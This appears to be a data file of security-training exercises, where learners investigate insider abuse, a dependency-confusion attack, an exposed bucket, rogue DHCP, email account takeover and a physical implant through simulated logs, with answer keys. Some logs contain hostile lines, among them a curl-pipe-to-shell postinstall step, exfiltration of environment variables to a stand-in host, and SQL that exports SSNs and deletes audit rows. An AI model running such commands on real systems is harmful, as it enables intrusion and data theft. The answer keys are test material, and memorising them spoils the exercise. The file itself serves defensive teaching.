// System-analysis scenarios, part 4: insider privilege abuse, supply-chain (dependency confusion), exposed cloud
// storage, rogue DHCP / DNS hijack, business email compromise by account takeover, a physical implant.
export default [
  // ───────────── 13. insider abuse of privileged access ─────────────
  {
    d: 4, t: 'match', o: '4.6', lv: 7.8,
    x: 'Systems: PAM-01 (privileged access manager), DB-PROD (production database), CHG-LOG (change and ticket records), HR-SYS (HR records)',
    p: [
      {
        name: 'PAM-01', role: 'Privileged access manager',
        s: [['Checkout and session records, 13 Mar', `22:31  rhall  checked out  DBA-BREAKGLASS (shared credential)   ticket: (none)   justification: "."   approver: auto-approved (break-glass)
22:31  session recording: ON    session 8841 started from 10.2.9.41
22:58  rhall  session 8841 ended
Normal use: break-glass is used for outages only; last use 7 months ago (incident INC-1102)`]]
      },
      {
        name: 'DB-PROD', role: 'Production database · db-prod01',
        s: [['Audit log, session 8841', `22:33  SELECT * FROM hr.exec_compensation              rows: 38
22:35  SELECT name, ssn, salary FROM hr.employees       rows: 4,120
22:41  CREATE USER 'tmp_audit' IDENTIFIED BY '********'
22:41  GRANT ALL PRIVILEGES ON *.* TO 'tmp_audit'
22:47  SELECT ... INTO OUTFILE '/tmp/emp_export.csv'     rows: 4,120
22:52  DELETE FROM mysql.general_log WHERE event_time > '2026-03-13 22:30'
Role of rhall: DBA for the billing application database only`]]
      },
      {
        name: 'CHG-LOG', role: 'Change management and ticketing',
        s: [['Search: changes and tickets for db-prod01 on 13 Mar', `No approved change records.
No open incidents.
Last approved maintenance window: 2026-03-08 02:00-04:00`]]
      },
      {
        name: 'HR-SYS', role: 'HR records · context',
        s: [['Employee record: rhall (Database Administrator)', `Status:       Active   Performance review: "Needs improvement" (Mar 5)
Manager note: employee told colleagues about "a better offer" after being passed over for promotion
Authorized data: billing application database only; HR tables are restricted to HR analysts`]]
      }
    ],
    q: 'Review the evidence from the four systems and complete the analysis.',
    choices: ['Insider threat: abuse of privileged access', 'External attacker', 'Authorized maintenance', 'Misconfiguration'],
    items: [
      ['Most likely explanation', 'Insider threat: abuse of privileged access'],
      ['Data the user was not authorized to access', 'HR employee data, including SSNs and executive compensation', ['Billing application tables', 'HR employee data, including SSNs and executive compensation', 'The break-glass credential itself', 'Nothing: DBAs may read any table']],
      ['Actions that create persistence', 'Creating the tmp_audit account with full privileges', ['Creating the tmp_audit account with full privileges', 'Selecting from the HR tables', 'Exporting the CSV', 'Starting a recorded session']],
      ['Action that hides the activity', 'Deleting rows from the database general log', ['Deleting rows from the database general log', 'Using a break-glass account', 'Working at night', 'Using INTO OUTFILE']],
      ['Principle that was violated most directly', 'Least privilege and need-to-know', ['Least privilege and need-to-know', 'Defense in depth', 'Non-repudiation only', 'Availability']],
      ['Best control to prevent or detect this earlier', 'Just-in-time privileged access with ticket-linked approval, plus database activity monitoring', ['Just-in-time privileged access with ticket-linked approval, plus database activity monitoring', 'Longer password expiry', 'Disabling session recording', 'Allowing all DBAs to share credentials']]
    ],
    e: 'The break-glass credential was checked out at 22:31 with no ticket, a blank justification and automatic approval, and no change or incident exists to explain it. In the recorded session the DBA, whose role covers the billing database only, reads HR tables (38 executive compensation rows and 4,120 employee records with SSNs), creates a new account (tmp_audit) with ALL PRIVILEGES for persistence, exports the data to a CSV, and then deletes the log rows covering his session to hide it. HR context supplies a motive: disciplinary friction and a hinted job offer. This is an insider abusing privileged access, violating least privilege and need-to-know. Break-glass access that can be auto-approved without a ticket is a control gap; just-in-time access tied to an approved ticket, plus database activity monitoring that cannot be altered by the DBA, would stop or expose this much earlier.',
    w: ['A DBA\'s late-night session looks wrong. Investigate across the four systems.', 'Use the access records, audit log, change records and HR context to answer the tasks.']
  },

  // ───────────── 14. dependency confusion supply-chain attack ─────────────
  {
    d: 2, t: 'match', o: '2.2', lv: 8.4,
    x: 'Pipeline: developer commit -> BUILD-01 (CI) -> ARTIFACT-REPO -> PROD-APP01. Internal package registry: registry.corp.example. Public registry: registry.npmjs.org.',
    p: [
      {
        name: 'BUILD-01', role: 'CI build server · 10.0.70.5',
        s: [['npm install log (build #4417)', `npm http fetch GET 200 https://registry.npmjs.org/corp-auth-lib  (public registry)
npm http fetch GET 404 https://registry.corp.example/corp-auth-lib/-/corp-auth-lib-2.3.1.tgz  (no auth token available to this job)
added corp-auth-lib@99.0.0
> corp-auth-lib@99.0.0 postinstall
> curl -s https://cdn-assets.example/i.sh | sh
Build completed: success`],
        ['package.json / lockfile', `"corp-auth-lib": "^2.3.1"
package-lock.json: not committed (npm install used instead of npm ci)
.npmrc: no scope-to-registry mapping for @corp / corp-*`]]
      },
      {
        name: 'EGRESS-PX', role: 'Proxy for build network',
        s: [['Proxy log, 14 Mar', `03:12:41  BUILD-01  GET  https://registry.npmjs.org/corp-auth-lib   200
03:12:44  BUILD-01  GET  https://cdn-assets.example/i.sh        200  (first seen domain, registered 5 days ago)
03:12:46  BUILD-01  POST https://cdn-assets.example/c          200  1.1 KB   (contains environment variables)
Build network policy: egress allowed to registry.corp.example and registry.npmjs.org only (policy exception "dev-tools-temp": any HTTPS)`]]
      },
      {
        name: 'ARTIFACT-REPO', role: 'Internal artifact repository',
        s: [['Build #4417 artifact', `SHA256: 7c1e...b90a     Signed: yes (build-signing key, valid)
Contents differ from build #4416 in: node_modules/corp-auth-lib (new file: lib/telemetry.js, 3.1 KB)
Reproducible-build check: not enabled`]]
      },
      {
        name: 'PROD-APP01', role: 'Production application server',
        s: [['EDR alert, 14 Mar 06:02', `node.exe (pid 3318) -> outbound TLS to 203.0.113.140:443 every 120 s  (new destination)
Process loaded: /opt/app/node_modules/corp-auth-lib/lib/telemetry.js
Deployment: build #4417 at 05:40`]]
      }
    ],
    q: 'A new build is beaconing from production. Investigate the pipeline and complete the tasks.',
    choices: ['Supply chain attack: dependency confusion', 'Typosquatting', 'Compromised developer laptop', 'Zero-day in the web framework'],
    items: [
      ['Attack in progress', 'Supply chain attack: dependency confusion'],
      ['Why the malicious package was installed', 'The build could not reach the internal registry, so npm took the public package with the same name and a higher version', ['The build could not reach the internal registry, so npm took the public package with the same name and a higher version', 'The developer typed the package name wrongly', 'The package was signed by the internal registry', 'The lockfile pinned version 99.0.0']],
      ['What the postinstall script did on BUILD-01', 'Downloaded and ran a script and sent environment variables (possible secrets) to an external server', ['Downloaded and ran a script and sent environment variables (possible secrets) to an external server', 'Encrypted the source code', 'Opened an inbound port', 'Restarted the build agent']],
      ['Why the signature on the artifact did not help', 'The build system itself signed the build that included the malicious package', ['The build system itself signed the build that included the malicious package', 'Signatures cannot be verified', 'The signing key had expired', 'The repository does not use signatures']],
      ['Weaknesses that allowed the attack', 'No scope-to-registry mapping or lockfile, and an overly broad egress exception for the build network', ['No scope-to-registry mapping or lockfile, and an overly broad egress exception for the build network', 'The use of HTTPS', 'Too many developers', 'The production firewall']],
      ['Best FIRST response', 'Isolate PROD-APP01 and rotate every secret exposed to BUILD-01, then roll back to the last good build', ['Delete package-lock.json', 'Isolate PROD-APP01 and rotate every secret exposed to BUILD-01, then roll back to the last good build', 'Block the CDN domain and close the ticket', 'Reboot BUILD-01']]
    ],
    e: 'The build job had no credentials for the internal registry (404 on the internal package), and without a scope mapping npm fell back to the public registry, where an attacker had published the same package name with the higher version 99.0.0: dependency confusion, a supply chain attack. Its postinstall script ran a remote script and POSTed environment variables (which in CI often hold secrets) to a brand-new domain; the proxy allowed it because of a broad "dev-tools-temp" egress exception. The artifact repository signed the compromised build with a valid key, so the signature proves only that the build system produced it, not that the contents were clean. Production then loaded the new telemetry.js and began beaconing. Contain and recover: isolate the production host, rotate secrets that BUILD-01 held, and roll back to the last good build. Prevent recurrence with scope-to-registry mappings, lockfiles with integrity hashes (npm ci), restricted build egress, and an SBOM and reproducible build checks.',
    w: ['Production started beaconing after a new deployment. Investigate the pipeline.', 'Use the build, proxy, artifact and production evidence to determine what happened.']
  },

  // ───────────── 15. exposed cloud storage ─────────────
  {
    d: 3, t: 'match', o: '3.1', lv: 6.8,
    x: 'Cloud account with object storage bucket "customer-exports", audit trail and access logging enabled.',
    p: [
      {
        name: 'BUCKET-CONFIG', role: 'Bucket configuration',
        s: [['Settings', `Bucket:                customer-exports
Block Public Access:   OFF  (account-level setting also OFF)
ACL:                   AllUsers: READ
Default encryption:    none
Versioning:            disabled
Contents:              customers_2025.csv (name, email, address, last 4 of card), invoices/*.pdf`]]
      },
      {
        name: 'ACCESS-LOGS', role: 'Bucket access logs, last 7 days',
        s: [['Requests (excerpt)', `Mar 08 14:02  GET  /customers_2025.csv   200  184 MB   203.0.113.8     curl/8.0
Mar 09 03:44  GET  /                      200  (listing)  45.155.205.9   python-requests/2.31
Mar 09 03:45  GET  /customers_2025.csv   200  184 MB   45.155.205.9   python-requests/2.31
Mar 10 11:20  GET  /customers_2025.csv   200  184 MB   198.51.100.201 Go-http-client/2.0
Mar 11 09:01  GET  /invoices/           200  (listing)  192.0.2.55     Mozilla/5.0
Authenticated requests (IAM): 0 in the last 7 days
Distinct external IPs: 37`]]
      },
      {
        name: 'CLOUD-AUDIT', role: 'Cloud audit trail',
        s: [['Configuration changes', `Mar 07 16:12  DeletePublicAccessBlock  (account)   user: jdev   source: console
Mar 07 16:14  PutBucketAcl  customer-exports  grants AllUsers READ   user: jdev
Change ticket for these changes: none
Note: jdev wanted to share a file with a partner "quickly"`]]
      },
      {
        name: 'DATA-CLASS', role: 'Data classification',
        s: [['Scan results for customers_2025.csv', `Contains personal data: 92,400 records
Classification: CONFIDENTIAL (PII)   Owner: Marketing
Applicable: privacy regulations with breach notification obligations`]]
      }
    ],
    q: 'A security researcher reports customer data is public. Review the evidence and complete the tasks.',
    choices: ['Cloud storage misconfiguration', 'Compromised credentials', 'SQL injection', 'Ransomware'],
    items: [
      ['Root cause', 'Cloud storage misconfiguration'],
      ['Settings that exposed the data', 'Public Access Block removed and an AllUsers READ ACL added', ['Public Access Block removed and an AllUsers READ ACL added', 'Missing default encryption', 'Disabled versioning', 'An IAM policy that allowed PutObject']],
      ['Evidence that unauthorized parties downloaded the data', 'Anonymous downloads of the CSV from external IPs, with zero authenticated requests', ['Anonymous downloads of the CSV from external IPs, with zero authenticated requests', 'The bucket has versioning disabled', 'The file is classified confidential', 'The audit trail is enabled']],
      ['Immediate containment', 'Re-enable Block Public Access and remove the public ACL', ['Re-enable Block Public Access and remove the public ACL', 'Delete the audit logs', 'Enable versioning only', 'Rename the bucket']],
      ['Next steps after containment', 'Assess the exposure from the logs and follow breach-notification obligations', ['Assess the exposure from the logs and follow breach-notification obligations', 'Do nothing: the data was only exposed for a few days', 'Wait for a customer complaint', 'Encrypt the file in place and say nothing']],
      ['Best preventive control', 'Policy that denies public access at the account or organization level, with a cloud security posture management (CSPM) alert', ['Policy that denies public access at the account or organization level, with a cloud security posture management (CSPM) alert', 'More frequent password changes', 'A web application firewall', 'Disabling logging to reduce cost']]
    ],
    e: 'The configuration record shows both layers of protection removed: on 7 March, jdev deleted the account-level Public Access Block and then granted AllUsers READ on the bucket, with no change ticket. The access log shows anonymous GETs (zero authenticated requests) of customers_2025.csv from several external IPs and tools (curl, python-requests, Go), and bucket listings: the data was found and downloaded. This is a misconfiguration, not a break-in with stolen credentials. Contain by restoring Block Public Access and removing the public ACL, then use the logs to scope the exposure (92,400 PII records) and follow breach-notification obligations. Prevent recurrence with organization-level policy that denies public access (so one console user cannot override it), plus CSPM alerting on public buckets.',
    w: ['Customer data was found on a public bucket. Investigate how and what to do.', 'Review the configuration, logs and audit trail to answer the tasks.']
  },

  // ───────────── 16. rogue DHCP / DNS hijack ─────────────
  {
    d: 2, t: 'match', o: '2.4', lv: 6.9,
    x: 'Office LAN 192.168.1.0/24: router/DHCP 192.168.1.1, DNS 192.168.1.2 (legitimate), switch SW-OFF, user PC-FIN-02',
    p: [
      {
        name: 'PC-FIN-02', role: 'Finance workstation · DHCP client',
        s: [['ipconfig /all', `   DHCP Server . . . . : 192.168.1.250
   Default Gateway . . : 192.168.1.250
   DNS Servers . . . . : 192.168.1.250
   Lease Obtained. . . : Friday, 14 March 2026 08:02`],
        ['nslookup onlinebank.example', `Server:   192.168.1.250
Address:  192.168.1.250#53
Name:     onlinebank.example
Address:  203.0.113.99       (the bank's real address is 198.51.100.50)`],
        ['Browser', 'Certificate warning for https://onlinebank.example (issuer: unknown)']]
      },
      {
        name: 'DHCP-LEGIT', role: 'Router / DHCP server · 192.168.1.1',
        s: [['DHCP leases', `192.168.1.30  PC-HR-01   offered DNS 192.168.1.2  gateway 192.168.1.1
192.168.1.31  PC-FIN-01  offered DNS 192.168.1.2  gateway 192.168.1.1
(no lease record for PC-FIN-02 since 08:02; its DHCPREQUEST was answered by another server)
Configuration unchanged. Admin logins: none today.`]]
      },
      {
        name: 'SW-OFF', role: 'Office switch',
        s: [['Syslog / port status', `08:01:58  DHCPOFFER seen on Gi0/12 from 192.168.1.250 (not a trusted DHCP port)
Gi0/12  connected  vlan 1  MAC 00:0c:29:ab:cd:ef  (unmanaged device, conference room wall jack)
DHCP snooping: disabled`]]
      },
      {
        name: 'DNS-LEGIT', role: 'Internal DNS · 192.168.1.2',
        s: [['Query log, 08:00–09:00', `onlinebank.example  A  -> 198.51.100.50  (queries from 11 clients, all correct)
No queries received from PC-FIN-02 since 08:02
Zone files: unchanged`]]
      }
    ],
    q: 'A finance user sees certificate warnings only on her PC. Investigate and complete the tasks.',
    choices: ['Rogue DHCP server leading to DNS hijack (pharming)', 'ARP poisoning', 'DNS cache poisoning of the internal server', 'Compromised router'],
    items: [
      ['Attack in progress', 'Rogue DHCP server leading to DNS hijack (pharming)'],
      ['Where the attacker\'s device is', 'Plugged into a conference-room wall jack on switch port Gi0/12', ['Plugged into a conference-room wall jack on switch port Gi0/12', 'Running on DNS-LEGIT', 'Inside the legitimate router', 'On the bank\'s network']],
      ['Why only PC-FIN-02 is affected', 'It was the client whose DHCP request was answered first by the rogue server', ['It was the client whose DHCP request was answered first by the rogue server', 'Its DNS cache is corrupt', 'The internal DNS zone was changed', 'Finance users have a different VLAN']],
      ['What the false DNS answer allows', 'Redirecting the user to a fake banking site to steal credentials', ['Redirecting the user to a fake banking site to steal credentials', 'Making the DHCP lease permanent', 'Disabling the router', 'Capturing only broadcast traffic']],
      ['DNS-LEGIT and the router', 'Not compromised', ['Compromised', 'Not compromised', 'Replaced by the attacker']],
      ['Best preventive control', 'DHCP snooping with only trusted uplink ports allowed to send DHCP offers, plus 802.1X / port security on wall jacks', ['DHCP snooping with only trusted uplink ports allowed to send DHCP offers, plus 802.1X / port security on wall jacks', 'Longer DHCP leases', 'Hiding the SSID', 'A second DNS server on the same VLAN']]
    ],
    e: 'PC-FIN-02 received its DHCP lease from 192.168.1.250, not the real server (192.168.1.1), and so uses that address as its gateway and DNS server. The rogue DNS answers onlinebank.example with 203.0.113.99 instead of 198.51.100.50 (pharming) and the browser warns about an unknown certificate. The legitimate router and DNS logs are clean, and 11 other clients resolve the real address. The switch shows the DHCPOFFER arriving on Gi0/12, an unmanaged device on a conference-room wall jack, with DHCP snooping disabled. This is a rogue DHCP server leading to a DNS hijack, not ARP poisoning (the gateway MAC was not forged) and not a compromise of the internal servers. DHCP snooping trusts only uplink ports, so offers from an access port are dropped; 802.1X or port security keeps unauthorized devices off wall jacks.',
    w: ['One workstation resolves a bank to the wrong address. Find out why.', 'Use the client, DHCP, switch and DNS evidence to identify the attack.']
  },

  // ───────────── 17. business email compromise by account takeover ─────────────
  {
    d: 2, t: 'match', o: '2.2', lv: 7.6,
    x: 'Systems: MAIL-AUDIT (mail platform sign-in and mailbox audit logs), MAIL-GW (outbound mail), FIN-APP (payments system), WS-CFO (the CFO\'s laptop)',
    p: [
      {
        name: 'MAIL-AUDIT', role: 'Mail platform audit · cfo@company.com',
        s: [['Sign-in log', `Mar 12 08:55  cfo@company.com  Success  Chicago, US     198.51.100.44   Browser (MFA satisfied)
Mar 13 19:20  cfo@company.com  Success  Lagos, NG       203.0.113.60    IMAP (legacy protocol, MFA not required)
Mar 13 19:21  cfo@company.com  Success  Lagos, NG       203.0.113.60    IMAP`],
        ['Mailbox audit', `Mar 13 19:24  New-InboxRule  "sync"   conditions: subject contains "invoice" or "wire"
                          actions: forward to accounts-update@mailbox-mail.example; move to RSS Subscriptions
Mar 13 19:26  MailItemsAccessed  412 items (folder: Sent Items)`]]
      },
      {
        name: 'MAIL-GW', role: 'Mail gateway · outbound',
        s: [['Message trace, Mar 14 09:03', `From: cfo@company.com   To: ap@company.com
Subject: RE: Vendor payment - Apex Supplies
Authentication: SPF pass   DKIM pass   DMARC pass   (sent through the company mail platform)
Source IP of client: 203.0.113.60 (Lagos, NG)
Body: "Please update Apex's banking details before today's wire. New account attached. Keep this between us."`]]
      },
      {
        name: 'FIN-APP', role: 'Payments application',
        s: [['Vendor master changes and payments', `Mar 14 09:40  Apex Supplies: bank account changed  requested by: ap@company.com  approved: ap-manager (no call-back recorded)
Mar 14 11:15  Wire  $284,500  to Apex Supplies (new account)   Status: released`]]
      },
      {
        name: 'WS-CFO', role: 'CFO laptop · 10.1.2.15',
        s: [['EDR status', `No detections. No unusual processes, no remote-access tools, no new browser extensions.
Last sign-in on this laptop: Mar 14 08:12 (office)`]]
      }
    ],
    q: 'A $284,500 wire went to the wrong account. Review the four systems and complete the analysis.',
    choices: ['Business email compromise (account takeover)', 'Email spoofing', 'Ransomware', 'Malware on the CFO laptop'],
    items: [
      ['Attack in progress', 'Business email compromise (account takeover)'],
      ['Why SPF, DKIM and DMARC all passed', 'The message was sent from the real mailbox through the company mail platform', ['The message was sent from the real mailbox through the company mail platform', 'The attacker forged the headers perfectly', 'DMARC is disabled', 'The gateway skipped checks']],
      ['How the attacker bypassed MFA', 'Signed in using a legacy protocol (IMAP) that does not require MFA', ['Signed in using a legacy protocol (IMAP) that does not require MFA', 'Cloned the MFA token', 'Guessed the MFA code', 'Used the CFO\'s laptop']],
      ['Purpose of the "sync" inbox rule', 'Forward and hide messages about invoices and wires so the victim does not notice', ['Forward and hide messages about invoices and wires so the victim does not notice', 'Improve mailbox performance', 'Archive old messages', 'Block spam']],
      ['WS-CFO status', 'Not compromised', ['Compromised', 'Not compromised', 'Source of the attack']],
      ['Control that would have prevented the loss', 'Out-of-band call-back verification for any change to vendor bank details', ['Out-of-band call-back verification for any change to vendor bank details', 'A longer wire approval email', 'Blocking all external email', 'Reimaging the laptop']],
      ['Best preventive configuration', 'Block legacy authentication and enforce MFA with conditional access', ['Block legacy authentication and enforce MFA with conditional access', 'Require a monthly password change only', 'Disable mailbox auditing', 'Hide the CFO from the address book']]
    ],
    e: 'This is not spoofing: all of SPF, DKIM and DMARC pass because the request really did come from the CFO\'s mailbox through the company platform, but the client IP is in Lagos. The sign-in log shows the attacker using IMAP, a legacy protocol that does not require MFA, from Lagos; they then created an inbox rule that forwards and hides messages containing "invoice" or "wire", and read 412 sent items to study how payments are handled. The next morning they emailed accounts payable from the CFO\'s mailbox to change a vendor\'s bank details, and a $284,500 wire went out with no call-back. The CFO\'s laptop is clean, so this is account takeover (a credential compromise), not malware. Out-of-band verification of any change to payment details stops the fraud even when the email looks perfect; blocking legacy authentication and requiring MFA with conditional access closes the way in.',
    w: ['A fraudulent wire was approved after an email from the CFO. Investigate how.', 'Work out whether this email was spoofed or sent from a compromised account.']
  },

  // ───────────── 18. physical implant ─────────────
  {
    d: 2, t: 'match', o: '2.2', lv: 6.4,
    x: 'Building: front lobby (badge reader), conference room B wall jack, access switch SW-FL2, NAC (network access control), SIEM',
    p: [
      {
        name: 'BADGE-SYS', role: 'Physical access control',
        s: [['Door log, front lobby, 14 Mar', `12:41:07  Badge 20418 (dkim)         Door 1  Granted
12:41:09  Door 1 held open 6 seconds     (two people entered on one badge read)
12:41:30  Badge 20418 (dkim)         Conference B  Granted
12:42:15  Badge 20418 (dkim) reader: Lobby exit  --  no exit recorded
dkim is a contractor, badge issued for 9:00-17:00 Tue/Thu; today is Friday`]]
      },
      {
        name: 'NAC', role: 'Network access control',
        s: [['New device alert, 12:44', `Port Gi0/14 (conference room B) : new MAC b8:27:eb:12:34:56   OUI: Raspberry Pi Foundation
Not in asset inventory     802.1X: not supported     Placed in: default VLAN 1 (NAC in monitor mode)
IP assigned: 10.1.40.77`]]
      },
      {
        name: 'SIEM', role: 'Network monitoring',
        s: [['Traffic from 10.1.40.77, 12:45-13:10', `12:45  ARP/ping sweep of 10.1.0.0/16 (65,534 hosts)
12:48  TCP SYN scan of 10.1.10.0/24 ports 22, 80, 139, 445, 3389, 8080
12:52  SMB null-session attempts to 10.1.10.4 (file server)
13:01  Outbound TLS to 198.51.100.222:443 every 30 s (small packets)`]]
      },
      {
        name: 'SW-FL2', role: 'Access switch',
        s: [['Port Gi0/14', `Port security: disabled     Description: "CONF-B wall jack"
Connected device draws 2.4 W   Link: 1 Gbps full duplex
Wall jack is on the same VLAN as user workstations`]]
      }
    ],
    q: 'Physical and network alerts occurred within minutes of each other. Review them and complete the tasks.',
    choices: ['Tailgating', 'Rogue device implant', 'Reconnaissance and C2', 'Badge cloning'],
    items: [
      ['How the person got in', 'Tailgating', ['Tailgating', 'Badge cloning', 'Lock picking', 'Dumpster diving']],
      ['What was connected to conference room B', 'Rogue device implant'],
      ['What the device is doing from 12:45', 'Reconnaissance and C2'],
      ['Control that would have stopped the entry', 'A mantrap or turnstile, and guard or staff challenge of unbadged visitors', ['A mantrap or turnstile, and guard or staff challenge of unbadged visitors', 'A stronger Wi-Fi password', 'Antivirus on the lobby PC', 'Longer badge numbers']],
      ['Control that would have blocked the device on the network', 'NAC in enforcement mode with 802.1X and port security on wall jacks', ['NAC in enforcement mode with 802.1X and port security on wall jacks', 'A longer DHCP lease', 'A faster switch', 'Disabling ICMP only']],
      ['Best immediate response', 'Disconnect the device from the port, preserve it as evidence, and review the logs for what it reached', ['Disconnect the device from the port, preserve it as evidence, and review the logs for what it reached', 'Ignore it: it is only a Raspberry Pi', 'Reformat the device and reuse it', 'Wait for the 5 PM scan']]
    ],
    e: 'The door log shows one badge read followed by the door being held open for six seconds (two people entered): tailgating, with a contractor badge being used outside its normal days and no recorded exit. Within minutes NAC sees an unknown Raspberry Pi in conference room B, placed on the user VLAN because NAC is only monitoring, and the SIEM shows that device sweeping the network, scanning ports and attempting SMB null sessions before beaconing out every 30 seconds: reconnaissance and a command-and-control channel from a rogue implant. Physical controls (mantrap, turnstile, staff challenge) address the entry; NAC enforcement with 802.1X and port security on wall jacks would have kept the device off the network. Respond by removing and preserving the device and reviewing what it reached.',
    w: ['Combine the physical and network evidence to determine what happened in the building.', 'A suspicious device appeared minutes after a door alarm. Investigate and answer the tasks.']
  }
]
